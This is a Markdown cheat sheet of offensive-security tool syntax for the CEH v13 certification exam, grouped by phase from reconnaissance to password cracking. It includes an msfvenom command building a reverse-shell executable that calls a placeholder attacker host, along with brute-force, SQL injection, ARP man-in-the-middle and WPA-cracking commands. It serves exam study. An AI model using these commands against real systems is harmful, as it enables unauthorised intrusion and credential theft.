# ⚡ CEH Quick Commands & Syntax – High-Yield

This file contains **must-know commands** for CEH v13.  
Memorize these exact syntaxes — EC-Council often asks either **“Which command would you run?”** or shows an output and asks **“Which tool produced this?”**.

---

## 🔹 Reconnaissance
**theHarvester** – Gather emails, subdomains  
```bash
theHarvester -d example.com -l 100 -b google
```

**whois** – Domain registration info  
```bash
whois example.com
```

**dig** – Query DNS records  
```bash
dig ANY example.com
dig MX example.com
```

**dnsrecon** – DNS enumeration  
```bash
dnsrecon -d example.com -t axfr
```

**subfinder** – Subdomain discovery  
```bash
subfinder -d example.com
```

---

## 🔹 Scanning & Enumeration
**nmap** – Full TCP scan, service detection, OS fingerprinting  
```bash
nmap -sV -A -p- target
```

**rustscan** – Fast port scan + Nmap  
```bash
rustscan -a target --ulimit 5000 -- -sV
```

**enum4linux** – SMB enumeration  
```bash
enum4linux -a target
```

**snmpwalk** – SNMP data gathering  
```bash
snmpwalk -v2c -c public target
```

**nbtstat** – NetBIOS info (Windows)  
```bash
nbtstat -A targetIP
```

---

## 🔹 Exploitation
**msfconsole** – Start Metasploit  
```bash
msfconsole
search exploit_name
use exploit/path
set RHOSTS target
set PAYLOAD payload_type
run
```

**msfvenom** – Payload generation  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=4444 -f exe -o shell.exe
```

**hydra** – Brute force login  
```bash
hydra -l admin -P passwords.txt ssh://target
```

**sqlmap** – SQL injection  
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

---

## 🔹 Post-Exploitation
**netcat** – Reverse shell listener  
```bash
nc -lvnp 4444
```

**ettercap** – MITM attack  
```bash
ettercap -T -M arp:remote /target1/ /target2/
```

**bettercap** – Modern MITM framework  
```bash
bettercap -iface eth0
```

---

## 🔹 Wireless Attacks
**airmon-ng** – Enable monitor mode  
```bash
airmon-ng start wlan0
```

**airodump-ng** – Capture handshake  
```bash
airodump-ng wlan0mon
```

**aircrack-ng** – Crack WPA handshake  
```bash
aircrack-ng capture.cap -w wordlist.txt
```

---

## 🔹 Web App & WAF Testing
**gobuster** – Directory brute force  
```bash
gobuster dir -u http://target.com -w wordlist.txt
```

**wafw00f** – WAF detection  
```bash
wafw00f http://target.com
```

---

## 🔹 Hash & Password Attacks
**hashcat** – Crack NTLM hash  
```bash
hashcat -m 1000 hash.txt wordlist.txt
```

**john** – Crack passwords  
```bash
john --wordlist=wordlist.txt hash.txt
```

**md5sum** – Generate file hash  
```bash
md5sum file.txt
```

---

## 🔹 Encoding & Decoding
**CyberChef** – Browser-based, drag-and-drop  
**base64** – Encode/Decode  
```bash
echo "text" | base64
echo "dGVzdA==" | base64 -d
```

---

## 📌 Exam Tips
- Always **associate tool → attack phase → scenario**.
- EC-Council may replace `target` with an **IP**, `example.com`, or leave blanks for you to fill.
- Syntax questions often hide the answer in **flags** (`-sV`, `-A`, `-p-`).
